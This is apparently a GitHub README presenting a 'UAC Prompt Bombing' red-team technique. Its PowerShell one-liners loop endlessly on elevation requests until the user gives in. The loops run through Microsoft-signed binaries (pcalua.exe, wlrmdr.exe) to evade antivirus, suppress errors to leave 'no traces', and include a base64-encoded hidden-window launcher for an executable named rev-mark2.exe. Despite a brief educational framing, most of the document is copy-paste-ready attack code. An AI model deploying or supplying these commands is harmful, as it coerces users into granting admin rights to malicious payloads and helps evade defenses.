# ⚡ UAC Prompt Bombing



[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-blue?logo=powershell)](https://microsoft.com/powershell)
[![Windows](https://img.shields.io/badge/Windows-10%2B-red?logo=windows)](https://www.microsoft.com/windows)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Stars](https://img.shields.io/github/stars/yourusername/uac-buster?style=social)](https://github.com/yourusername/uac-buster)

---

> **🔥 Red Team Magic: Spam UAC prompts until admin rights are yours! 🔥**  
> A stealthy, loop-based PowerShell one-liner that abuses `pcalua.exe` (Microsoft-signed LOLBin) to relentlessly request elevation and launch your payload. Perfect for pentesting demos, CTFs, or ethical hacking labs. **Use responsibly—educational purposes only!** ⚠️


---

In August 2025, eSentire's Threat Response Unit (TRU) discovered 
"NightshadeC2," a new botnet that uses "UAC Prompt Bombing" to bypass 
malware analysis sandboxes and exclude the final payload from Windows 
Defender. 

[Read Full article](https://www.esentire.com/blog/new-botnet-emerges-from-the-shadows-nightshadec2)


---
## 🎯 Why This Rocks
- **Zero Dependencies** 🛠️: Pure PowerShell + built-in Windows binary.
- **Infinite Retries** 🔄: Silent failures? No problem—loops forever until success.
- **Stealth Mode** 🕶️: Errors suppressed, no console spam.
- **LOLBin Abuse** 🛡️: `pcalua.exe` evades AV/EDR (signed by Microsoft).
- **UAC Fatigue** 😈: Social engineering via prompt bombardment.
- **One-Liner Wonder** ✨: Copy-paste ready for quick deployment.


---

> **MITRE ATT&CK**: T1548.002 (Abuse Elevation Control Mechanism) 🗡️


## 🎯 Purpose

This repo explores and educates about UAC Prompt Bombing — a technique where users get spammed with multiple prompts (legit or fake) in rapid succession. 😵‍💫
We’ll focus on human factors, defensive detection, and mitigation through safe simulations and visual demos.

---

🧠 Goal: Help blue-teamers, sysadmins, and researchers understand the risks and develop better safeguards — ethically and responsibly.

---


---

## prompt_simulation.ps1

```powershell
try {throw ""} catch { while ( -not $? ){try {Start-Process cmd.exe -Verb RunAs} catch {Get-Item "+++++++++++++++++"}}}
```


https://github.com/user-attachments/assets/0d8aa39d-ee15-4bd7-a2a0-20049e09b756

---

```powershell
try {
	throw ""
} catch {
	while ( -not $? ){
		try {
			Start-Process cmd.exe -Verb RunAs
		} catch {
			Write-Error "" -ErrorAction SilentlyContinue
		}
	}
}
```
---

## 🧰 LOLBins (Living-Off-The-Land Binaries)

### LOLBins are legitimate, signed system tools that attackers can abuse for malicious purposes. 🧨

#### .. /Wlrmdr.exe

```powershell
try {throw ""} catch {while ( -not $? ){try {Start-Process wlrmdr.exe -ArgumentList "-s 3600 -f 0 -t _ -m _ -a 11 -u cmd.exe"  -Verb RunAs} catch {Write-Error "" -ErrorAction SilentlyContinue}}}
```
<p align="center"><img src="https://github.com/user-attachments/assets/b61815ce-bf4c-4e13-b779-6b994f6c63b0" alt="UAC Prompt Bombing Screenshot" width="600"></p>


---

#### .. /Pcalua.exe 

```powershell
try {throw ""} catch {while ( -not $? ){try {Start-Process pcalua.exe -ArgumentList "-a cmd.exe"  -Verb RunAs} catch {Write-Error "" -ErrorAction SilentlyContinue}}}
```

<p align="center"><img src="https://github.com/user-attachments/assets/c3815d46-d745-4f0e-bb3b-d8e1d4ea6ba2" alt="UAC Prompt Bombing Screenshot" width="600"></p>

---

## 🔍 Breakdown (Tech Mode Activated 🤓)

| Component | What It Does | 
|-----------|--------------|
| `try {throw ""}` | Forces a fake error to jump-start the loop. |
| `while (-not $?)` | Retries endlessly if last command failed (`$?` = failure flag). | 
| `Start-Process pcalua.exe -a <payload> -Verb RunAs` | Launches payload via trusted LOLBin with UAC elevation prompt. |
| `catch {Write-Error "" -ErrorAction SilentlyContinue}` | Swallows errors silently—no traces! |




---

### You can encode the whole thing.


<img width="1158" height="787" alt="Screenshot 2025-11-03 at 12 56 18 PM" src="https://github.com/user-attachments/assets/151af48b-c513-4dc7-803e-cc56a1ce45bd" />


### run it as 

```powershell
powershell -noni -w hidden -e dAByAHkAIAB7AHQAaAByAG8AdwAgACIAIgB9ACAAYwBhAHQAYwBoACAAewB3AGgAaQBsAGUAIAAoACAALQBuAG8AdAAgACQAPwAgACkAewB0AHIAeQAgAHsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAYwBhAGwAdQBhAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAGEAIABDADoAXABVAHMAZQByAHMAXAByAGUAZAB0AGUAYQBtAFwARABlAHMAawB0AG8AcABcAHIAZQB2AC0AbQBhAHIAawAyAC4AZQB4AGUAIgAgACAALQBWAGUAcgBiACAAUgB1AG4AQQBzAH0AIABjAGEAdABjAGgAIAB7AFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACIAIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQB9AH0AfQAgAA==
```

## execute any powershell script

```powershell
try {throw ""} catch {while ( -not $? ){try {Start-Process pcalua.exe -ArgumentList "-a C:\Users\redteam\Desktop\rev-mark2.exe"  -Verb RunAs} catch {Write-Error "" -ErrorAction SilentlyContinue}}}
```

---










